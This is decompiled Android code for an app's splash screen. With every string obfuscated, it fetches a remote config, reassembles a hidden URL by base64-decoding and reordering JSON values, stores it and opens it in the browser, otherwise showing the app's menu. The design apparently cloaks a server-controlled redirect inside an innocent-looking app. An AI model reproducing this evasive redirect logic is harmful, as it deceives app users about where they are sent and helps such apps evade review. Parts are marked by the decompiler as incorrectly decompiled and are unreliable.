package com.uxdepy.xxeubg;

import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import androidx.activity.ComponentActivity;
import com.joom.paranoid.Deobfuscator$app$Release;
import com.uxdepy.xxeubg.core.ProgressKt;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.Comparator;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Set;
import kotlin.Metadata;
import kotlin.Unit;
import kotlin.collections.CollectionsKt;
import kotlin.collections.SetsKt;
import kotlin.io.CloseableKt;
import kotlin.io.TextStreamsKt;
import kotlin.jvm.functions.Function0;
import kotlin.jvm.functions.Function1;
import kotlin.jvm.functions.Function2;
import kotlin.jvm.internal.Intrinsics;
import kotlin.ranges.RangesKt;
import kotlin.text.Charsets;
import kotlin.text.MatchResult;
import kotlin.text.Regex;
import kotlin.text.StringsKt;
import org.json.JSONObject;

/* compiled from: PrismPeakSplashActivity.kt */
@Metadata(d1 = {"\u0000L\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010\t\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0004\n\u0002\u0010\u000e\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\b\n\u0002\b\u0005\n\u0002\u0010\u000b\n\u0002\b\u0006\b\u0007\u0018\u00002\u00020\u0001B\u0007¢\u0006\u0004\b\u0002\u0010\u0003J\u0016\u0010\u0007\u001a\u00020\b2\f\u0010\t\u001a\b\u0012\u0004\u0012\u00020\b0\nH\u0002J\u0012\u0010\u000b\u001a\u00020\b2\b\u0010\f\u001a\u0004\u0018\u00010\rH\u0014J\u0010\u0010\u000e\u001a\n \u0010*\u0004\u0018\u00010\u000f0\u000fH\u0002J\b\u0010\u0011\u001a\u00020\bH\u0002J\b\u0010\u0012\u001a\u00020\bH\u0002J\u0012\u0010\u0013\u001a\u0004\u0018\u00010\u00142\u0006\u0010\u0015\u001a\u00020\u0016H\u0002J\u0018\u0010\u0017\u001a\u00020\u00182\u0006\u0010\u0019\u001a\u00020\u00142\u0006\u0010\u001a\u001a\u00020\u0014H\u0002J\u0014\u0010\u001b\u001a\u0004\u0018\u00010\u00142\b\u0010\u001c\u001a\u0004\u0018\u00010\u0014H\u0002J\u0010\u0010\u001d\u001a\u00020\u001e2\u0006\u0010\u001f\u001a\u00020\u0014H\u0002J\u0014\u0010 \u001a\u0004\u0018\u00010\u00142\b\u0010\u001c\u001a\u0004\u0018\u00010\u0014H\u0002J\b\u0010!\u001a\u00020\bH\u0002J\u0010\u0010\"\u001a\u00020\b2\u0006\u0010#\u001a\u00020\u0014H\u0002R\u000e\u0010\u0004\u001a\u00020\u0005X\u0082D¢\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0005X\u0082\u0004¢\u0006\u0002\n\u0000¨\u0006$"}, d2 = {"Lcom/uxdepy/xxeubg/PrismPeakSplashActivity;", "Landroidx/activity/ComponentActivity;", "<init>", "()V", "splashMinMs", "", "splashStart", "afterMinSplash", "", "action", "Lkotlin/Function0;", "onCreate", "savedInstanceState", "Landroid/os/Bundle;", "prefs", "Landroid/content/SharedPreferences;", "kotlin.jvm.PlatformType", "resolve", "fetch", "extractLinkFromConfig", "", "json", "Lorg/json/JSONObject;", "naturalCompare", "", "a", "b", "decodeBase64", "value", "isReadableText", "", "s", "findHttpLink", "goHome", "openUrl", "url", "app_release"}, k = 1, mv = {2, 1, 0}, xi = 48)
/* loaded from: classes.dex */
public final class PrismPeakSplashActivity extends ComponentActivity {
    private final long splashMinMs = 1300;
    private final long splashStart = System.currentTimeMillis();

    private final void afterMinSplash(final Function0<Unit> action) {
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() { // from class: com.uxdepy.xxeubg.PrismPeakSplashActivity$$ExternalSyntheticLambda2
            @Override // java.lang.Runnable
            public final void run() {
                Function0.this.invoke();
            }
        }, RangesKt.coerceAtLeast(this.splashMinMs - (System.currentTimeMillis() - this.splashStart), 0L));
    }

    @Override // androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.fragment_decision_gate);
        setRequestedOrientation(1);
        resolve();
    }

    private final SharedPreferences prefs() {
        return getSharedPreferences(Deobfuscator$app$Release.getString(-8812418894907194867L), 0);
    }

    private final void resolve() {
        String string = prefs().getString(Deobfuscator$app$Release.getString(-8812418933561900531L), Deobfuscator$app$Release.getString(-8812418959331704307L));
        if (string == null) {
            string = Deobfuscator$app$Release.getString(-8812418963626671603L);
        }
        if (prefs().getBoolean(Deobfuscator$app$Release.getString(-8812418967921638899L), false)) {
            goHome();
        } else if (string.length() > 0) {
            openUrl(string);
        } else {
            new Thread(new Runnable() { // from class: com.uxdepy.xxeubg.PrismPeakSplashActivity$$ExternalSyntheticLambda1
                @Override // java.lang.Runnable
                public final void run() {
                    PrismPeakSplashActivity.this.fetch();
                }
            }).start();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX WARN: Code restructure failed: missing block: B:15:0x0082, code lost:
    
        if (r5 == null) goto L23;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void fetch() {
        String string;
        final String str = null;
        try {
            URLConnection openConnection = new URL(ProgressKt.getPRSMPK_PRISM_PEAK()).openConnection();
            Intrinsics.checkNotNull(openConnection, Deobfuscator$app$Release.getString(-8812419010871311859L));
            HttpURLConnection httpURLConnection = (HttpURLConnection) openConnection;
            httpURLConnection.setRequestMethod(Deobfuscator$app$Release.getString(-8812419285749218803L));
            httpURLConnection.setConnectTimeout(15000);
            httpURLConnection.setReadTimeout(15000);
            httpURLConnection.setRequestProperty(Deobfuscator$app$Release.getString(-8812419302929087987L), Deobfuscator$app$Release.getString(-8812419332993859059L));
            int responseCode = httpURLConnection.getResponseCode();
            InputStream errorStream = (200 > responseCode || responseCode >= 300) ? httpURLConnection.getErrorStream() : httpURLConnection.getInputStream();
            if (errorStream != null) {
                Reader inputStreamReader = new InputStreamReader(errorStream, Charsets.UTF_8);
                BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
                try {
                    string = TextStreamsKt.readText(bufferedReader);
                    CloseableKt.closeFinally(bufferedReader, null);
                } finally {
                }
            }
            string = Deobfuscator$app$Release.getString(-8812419406008303091L);
            httpURLConnection.disconnect();
            if (200 <= responseCode && responseCode < 300 && !StringsKt.isBlank(string)) {
                str = extractLinkFromConfig(new JSONObject(string));
            }
        } catch (Exception unused) {
        }
        runOnUiThread(new Runnable() { // from class: com.uxdepy.xxeubg.PrismPeakSplashActivity$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                PrismPeakSplashActivity.fetch$lambda$5(str, this);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void fetch$lambda$5(String str, PrismPeakSplashActivity prismPeakSplashActivity) {
        if (str != null) {
            SharedPreferences prefs = prismPeakSplashActivity.prefs();
            Intrinsics.checkNotNullExpressionValue(prefs, Deobfuscator$app$Release.getString(-8812420316541369843L));
            SharedPreferences.Editor edit = prefs.edit();
            edit.putString(Deobfuscator$app$Release.getString(-8812420363786010099L), str);
            edit.apply();
            prismPeakSplashActivity.openUrl(str);
            return;
        }
        SharedPreferences prefs2 = prismPeakSplashActivity.prefs();
        Intrinsics.checkNotNullExpressionValue(prefs2, Deobfuscator$app$Release.getString(-8812420389555813875L));
        SharedPreferences.Editor edit2 = prefs2.edit();
        edit2.putBoolean(Deobfuscator$app$Release.getString(-8812420436800454131L), true);
        edit2.apply();
        prismPeakSplashActivity.goHome();
    }

    private final String extractLinkFromConfig(JSONObject json) {
        String str;
        final LinkedHashMap linkedHashMap = new LinkedHashMap();
        Iterator<String> keys = json.keys();
        while (true) {
            if (!keys.hasNext()) {
                break;
            }
            String next = keys.next();
            Object opt = json.opt(next);
            str = opt instanceof String ? (String) opt : null;
            if (str != null) {
                linkedHashMap.put(next, str);
            }
        }
        if (linkedHashMap.isEmpty()) {
            return null;
        }
        Set keySet = linkedHashMap.keySet();
        Intrinsics.checkNotNullExpressionValue(keySet, Deobfuscator$app$Release.getString(-8812419410303270387L));
        List list = CollectionsKt.toList(keySet);
        List list2 = list;
        List sorted = CollectionsKt.sorted(list2);
        final PrismPeakSplashActivity$extractLinkFromConfig$natural$1 prismPeakSplashActivity$extractLinkFromConfig$natural$1 = new PrismPeakSplashActivity$extractLinkFromConfig$natural$1(this);
        List sortedWith = CollectionsKt.sortedWith(list2, new Comparator() { // from class: com.uxdepy.xxeubg.PrismPeakSplashActivity$$ExternalSyntheticLambda3
            @Override // java.util.Comparator
            public final int compare(Object obj, Object obj2) {
                int extractLinkFromConfig$lambda$7;
                extractLinkFromConfig$lambda$7 = PrismPeakSplashActivity.extractLinkFromConfig$lambda$7(Function2.this, obj, obj2);
                return extractLinkFromConfig$lambda$7;
            }
        });
        Iterator it = SetsKt.linkedSetOf(list, sorted, sortedWith, CollectionsKt.reversed(list2), CollectionsKt.reversed(sorted), CollectionsKt.reversed(sortedWith)).iterator();
        Intrinsics.checkNotNullExpressionValue(it, Deobfuscator$app$Release.getString(-8812419479022747123L));
        while (it.hasNext()) {
            Object next2 = it.next();
            Intrinsics.checkNotNullExpressionValue(next2, Deobfuscator$app$Release.getString(-8812419539152289267L));
            List list3 = (List) next2;
            String joinToString$default = CollectionsKt.joinToString$default(list3, Deobfuscator$app$Release.getString(-8812419582101962227L), null, null, 0, null, new Function1() { // from class: com.uxdepy.xxeubg.PrismPeakSplashActivity$$ExternalSyntheticLambda4
                @Override // kotlin.jvm.functions.Function1
                public final Object invoke(Object obj) {
                    CharSequence extractLinkFromConfig$lambda$8;
                    extractLinkFromConfig$lambda$8 = PrismPeakSplashActivity.extractLinkFromConfig$lambda$8(linkedHashMap, (String) obj);
                    return extractLinkFromConfig$lambda$8;
                }
            }, 30, null);
            String joinToString$default2 = CollectionsKt.joinToString$default(list3, Deobfuscator$app$Release.getString(-8812419586396929523L), null, null, 0, null, new Function1() { // from class: com.uxdepy.xxeubg.PrismPeakSplashActivity$$ExternalSyntheticLambda5
                @Override // kotlin.jvm.functions.Function1
                public final Object invoke(Object obj) {
                    CharSequence extractLinkFromConfig$lambda$9;
                    extractLinkFromConfig$lambda$9 = PrismPeakSplashActivity.extractLinkFromConfig$lambda$9(PrismPeakSplashActivity.this, linkedHashMap, (String) obj);
                    return extractLinkFromConfig$lambda$9;
                }
            }, 30, null);
            String decodeBase64 = decodeBase64(joinToString$default);
            if (decodeBase64 == null) {
                decodeBase64 = Deobfuscator$app$Release.getString(-8812419590691896819L);
            }
            for (Object obj : CollectionsKt.listOf((Object[]) new String[]{joinToString$default, joinToString$default2, decodeBase64})) {
                Intrinsics.checkNotNullExpressionValue(obj, Deobfuscator$app$Release.getString(-8812419594986864115L));
                String findHttpLink = findHttpLink((String) obj);
                if (findHttpLink != null && (str == null || findHttpLink.length() > str.length())) {
                    str = findHttpLink;
                }
            }
        }
        return str;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final int extractLinkFromConfig$lambda$7(Function2 function2, Object obj, Object obj2) {
        return ((Number) function2.invoke(obj, obj2)).intValue();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final CharSequence extractLinkFromConfig$lambda$8(LinkedHashMap linkedHashMap, String str) {
        Intrinsics.checkNotNullParameter(str, Deobfuscator$app$Release.getString(-8812420479750127091L));
        String str2 = (String) linkedHashMap.get(str);
        return str2 != null ? str2 : Deobfuscator$app$Release.getString(-8812420492635028979L);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final CharSequence extractLinkFromConfig$lambda$9(PrismPeakSplashActivity prismPeakSplashActivity, LinkedHashMap linkedHashMap, String str) {
        Intrinsics.checkNotNullParameter(str, Deobfuscator$app$Release.getString(-8812420496929996275L));
        String decodeBase64 = prismPeakSplashActivity.decodeBase64((String) linkedHashMap.get(str));
        return decodeBase64 != null ? decodeBase64 : Deobfuscator$app$Release.getString(-8812420509814898163L);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final int naturalCompare(String a, String b) {
        String value;
        String value2;
        Integer num = null;
        MatchResult find$default = Regex.find$default(new Regex(Deobfuscator$app$Release.getString(-8812419637936537075L)), a, 0, 2, null);
        Integer intOrNull = (find$default == null || (value2 = find$default.getValue()) == null) ? null : StringsKt.toIntOrNull(value2);
        MatchResult find$default2 = Regex.find$default(new Regex(Deobfuscator$app$Release.getString(-8812419655116406259L)), b, 0, 2, null);
        if (find$default2 != null && (value = find$default2.getValue()) != null) {
            num = StringsKt.toIntOrNull(value);
        }
        return (intOrNull == null || num == null || Intrinsics.areEqual(intOrNull, num)) ? a.compareTo(b) : Intrinsics.compare(intOrNull.intValue(), num.intValue());
    }

    private final String decodeBase64(String value) {
        String str;
        String str2 = value;
        if (str2 != null && !StringsKt.isBlank(str2)) {
            String replace$default = StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(StringsKt.trim((CharSequence) str2).toString(), Deobfuscator$app$Release.getString(-8812419672296275443L), Deobfuscator$app$Release.getString(-8812419680886210035L), false, 4, (Object) null), Deobfuscator$app$Release.getString(-8812419685181177331L), Deobfuscator$app$Release.getString(-8812419693771111923L), false, 4, (Object) null), Deobfuscator$app$Release.getString(-8812419698066079219L), Deobfuscator$app$Release.getString(-8812419706656013811L), false, 4, (Object) null);
            if (replace$default.length() == 0) {
                return null;
            }
            String str3 = replace$default + StringsKt.repeat(Deobfuscator$app$Release.getString(-8812419710950981107L), (4 - (replace$default.length() % 4)) % 4);
            Iterator it = CollectionsKt.listOf((Object[]) new Integer[]{0, 8, 10}).iterator();
            while (it.hasNext()) {
                try {
                    byte[] decode = Base64.decode(str3, ((Number) it.next()).intValue());
                    Intrinsics.checkNotNullExpressionValue(decode, Deobfuscator$app$Release.getString(-8812419719540915699L));
                    str = new String(decode, Charsets.UTF_8);
                } catch (Exception unused) {
                }
                if (isReadableText(str)) {
                    return str;
                }
            }
        }
        return null;
    }

    private final boolean isReadableText(String s) {
        String str = s;
        if (StringsKt.isBlank(str) || StringsKt.contains$default((CharSequence) str, (char) 65533, false, 2, (Object) null)) {
            return false;
        }
        int i = 0;
        for (int i2 = 0; i2 < str.length(); i2++) {
            char charAt = str.charAt(i2);
            if (charAt == '\n' || charAt == '\r' || charAt == '\t' || !Character.isISOControl(charAt)) {
                i++;
            }
        }
        return ((double) i) >= ((double) s.length()) * 0.85d;
    }

    private final String findHttpLink(String value) {
        String str = value;
        if (str == null || StringsKt.isBlank(str)) {
            return null;
        }
        String obj = StringsKt.trim((CharSequence) str).toString();
        String str2 = obj;
        if (StringsKt.contains$default((CharSequence) str2, (char) 65533, false, 2, (Object) null)) {
            return null;
        }
        if (StringsKt.startsWith$default(obj, Deobfuscator$app$Release.getString(-8812419771080523251L), false, 2, (Object) null) || StringsKt.startsWith$default(obj, Deobfuscator$app$Release.getString(-8812419805440261619L), false, 2, (Object) null)) {
            return obj;
        }
        if (new Regex(Deobfuscator$app$Release.getString(-8812419844094967283L)).matches(str2)) {
            return "https://" + obj;
        }
        return null;
    }

    private final void goHome() {
        afterMinSplash(new Function0() { // from class: com.uxdepy.xxeubg.PrismPeakSplashActivity$$ExternalSyntheticLambda6
            @Override // kotlin.jvm.functions.Function0
            public final Object invoke() {
                Unit goHome$lambda$11;
                goHome$lambda$11 = PrismPeakSplashActivity.goHome$lambda$11(PrismPeakSplashActivity.this);
                return goHome$lambda$11;
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final Unit goHome$lambda$11(PrismPeakSplashActivity prismPeakSplashActivity) {
        prismPeakSplashActivity.startActivity(new Intent(prismPeakSplashActivity, (Class<?>) MenuActivity.class));
        prismPeakSplashActivity.finish();
        return Unit.INSTANCE;
    }

    private final void openUrl(String url) {
        try {
            Intent intent = new Intent(Deobfuscator$app$Release.getString(-8812420054548364787L), Uri.parse(url));
            intent.addCategory(Deobfuscator$app$Release.getString(-8812420170512481779L));
            intent.addFlags(268435456);
            startActivity(intent);
            finish();
        } catch (Exception unused) {
            goHome();
        }
    }
}
